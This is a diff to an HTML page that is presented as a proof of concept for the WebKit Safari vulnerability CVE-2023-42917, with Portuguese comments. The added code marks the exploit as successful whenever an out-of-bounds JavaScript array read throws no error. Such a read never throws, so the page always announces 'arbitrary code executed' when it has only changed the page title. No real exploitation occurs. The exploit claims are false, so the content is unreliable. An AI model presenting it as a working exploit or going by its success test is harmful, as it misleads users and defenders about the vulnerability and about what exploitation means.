@@ -8,8 +8,11 @@
 <body>
     <h1>PoC CVE-2023-42917 - WebKit Safari 17.0</h1>
     <p>Este código tenta demonstrar uma manipulação de memória para fins educacionais. </p>
+    <p id="result"></p>
 
     <script>
+        let isExploitSuccessful = false;  // Variável para verificar se o exploit teve sucesso
+
         // Função para criar um ArrayBuffer e fazer manipulação de dados
         function manipulateArrayBuffer() {
             console.log("Manipulando ArrayBuffer...");
@@ -59,13 +62,33 @@
             arr[0] = 0x41;  // A
             arr[1] = 0x42;  // B
             // Tentando acessar um índice fora dos limites
-            console.log("Valor fora dos limites do array:", arr[20]);  // Acesso fora dos limites
+            try {
+                console.log("Valor fora dos limites do array:", arr[20]);  // Acesso fora dos limites
+                isExploitSuccessful = true;  // Definir como bem-sucedido se não gerar erro
+            } catch (e) {
+                console.error("Erro ao acessar fora dos limites do array:", e);
+            }
+        }
+
+        // Função para executar código arbitrário caso o exploit seja bem-sucedido
+        function runExploitSuccess() {
+            if (isExploitSuccessful) {
+                console.log("Exploração bem-sucedida!");
+                document.getElementById("result").innerHTML = "<b>Exploração bem-sucedida!</b><br/>Código arbitrário executado.";
+                // Exemplo de código arbitrário: Modificar o título da página
+                document.title = "Exploit Sucesso!";
+            } else {
+                console.log("Exploração falhou.");
+            }
         }
 
         // Chamada para funções
         manipulateArrayBuffer();
         manipulateDOM();
         arrayOverflowTest();
+        
+        // Verificar sucesso após execução
+        runExploitSuccess();
     </script>
 </body>
 </html>
